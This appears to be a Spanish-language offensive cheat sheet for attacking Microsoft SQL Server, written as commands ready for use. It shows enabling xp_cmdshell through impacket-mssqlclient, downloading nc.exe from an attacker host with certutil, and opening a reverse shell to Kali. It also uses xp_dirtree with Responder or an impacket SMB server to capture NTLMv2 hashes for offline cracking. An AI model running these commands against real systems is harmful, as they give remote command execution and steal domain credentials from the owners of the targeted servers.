# Microsoft SQL Server 

Tags: #DC #MSSQLServer #Windows 

```bash 
# Microsoft MSSQL usa el protocolo SALT para generar una palabra aleatoria con el fin de prevenir las 'Rainbow Tables'

      0x0200 4D149B EDDBC10DEA544E18E2B8046D61484AE3FF7
      # Content Header = 0x0200
      # SALT = 4D149B
      # HASH = EDDBC10DEA544E18E2B8046D61484AE3FF7 
```

## Comandos 

```bash 
❯ impacket-mssqlclient domain1.corp/'user:password'@IP -windows-auth -port 1433    # Conectarse a la DB

	# domain = Dominio del DC
	# windows-auth = Indicar que las credenciales son a nivel de autenticación de Windows 
	# port = Puerto de la DB (opcional)

	❯ help                    # Panel de ayuda 
	❯ enable_xp_cmdshell      # Habilitar la funcionalidad para ejecutar comandos 
	❯ xp_cmdshell "whoami"    # Ejecutar un comando dentro de la DB
	❯ xp_cmdshell "dir C:\\"
	❯ EXEC xp_cmdshell 'certutil -urlcache -split -f http://IP/nc.exe C:\temp\nc.exe' # Subir un archivo 
	❯ EXEC xp_cmdshell 'C:\temp\nc.exe -e cmd.exe IP 443'   # Crear una revershell hacia Kali 
	❯ enum_db                 # Enumerar las DBs
	❯ enum_users              # Enumera los usuarios de la actual DB

	❯ xp_dirtree              # Enumera recursos SMB a nivel de red  
	❯ xp_dirtree C:\Users\    # Enumerar los recursos de los directorios en donde se tenga privilegios 
	❯ xp_dirtree C:\inetpub\wwwroot\    # Ruta raiz del servidor ISS
	❯ exit                    # Salir 


# Se puede interceptar un hash NTLMv2 e intentar crackear offline con 'Hashcat'
	❯ xp_dirtree \\IP\smbFolder\test     # Ejecutar desde la DB, colocando la dirección IP de Kali 

❯ impacket-smbserver smbFolder $(pwd) -smb2support    # Ejecutar en Kali para interceptar el hash
```

## Ataque con Responder para obtener el Hash NTLM 

```bash 
1. Ingresar a la DB con 'mssqlclient' y utilizar el siguiente comando:
❯ xp_dirtree \\IP\aa     # Compartir un recurso a nivel de red que no existe y Windows hará la autenticación

	# IP = Dirección IP de Kali 

2. En Kali ejecutar el responder 
❯ responder -I tun0        # Colocar en escucha 
	# v = Si se agrega el parámetro '-v' se podrá mirar el hash anteriormente capturado 

Notas:
	1. Antes de usar el comando 'xp_dirtree' se debe ejecutar el comando 'responder'
```

## Ataque con SQSH para obtener el Hash NTLM 

```bash 
1. Utilizar el siguiente comando:
❯ sqsh -S IP -U user -P passwd       # La IP y las credenciales son de la máquina víctima
	❯ xp_dirtree '\\IP\aa'          # Compartir un recurso a nivel de red que no existe y Windows hará la autenticación
	❯ go                            # Ejecutar la instrucción

2. En Kali ejecutar el responder 
❯ responder -I tun0        # Colocar en escucha 
	# v = Si se agrega el parámetro '-v' se podrá mirar el hash anteriormente capturado 

Notas:
	1. Antes de usar el comando 'xp_dirtree' se debe ejecutar el comando 'responder'
```